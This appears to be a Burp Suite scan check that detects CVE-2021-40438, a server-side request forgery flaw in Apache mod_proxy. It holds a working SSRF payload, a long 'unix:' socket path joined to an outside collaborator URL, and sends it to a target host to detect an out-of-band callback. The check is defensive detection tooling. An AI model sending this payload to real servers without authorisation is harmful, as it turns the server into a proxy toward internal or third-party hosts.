metadata:
    language: v2-beta
    name: "CVE-2021-40438 Apache earlier than 2.4.48 Mod_Proxy - Server-Side Request Forgery"
    description: "Apache 2.4.48 and below contain an issue where uri-path can cause mod_proxy to forward the request to an origin server chosen by the remote user."
    author: "lUcgryy"
    tags: "active", "CVE-2021-40438"

define:
    collaborator_address = `http://{generate_collaborator_address()}/`
    payload = `/?unix:{random_str(7701)}|{collaborator_address}`
    issueDetail = "Apache 2.4.48 and below contain an issue where uri-path can cause mod_proxy to forward the request to an origin server chosen by the remote user."
    issueRemediation = "Upgrade to Apache version 2.4.49 or later."
given host then
    send request called check:
        method: "GET"
        path: `{payload}`
    if http interactions then
        report issue:
            severity: high
            confidence: firm
            detail: `{issueDetail}`
            remediation: `{issueRemediation}`
    end if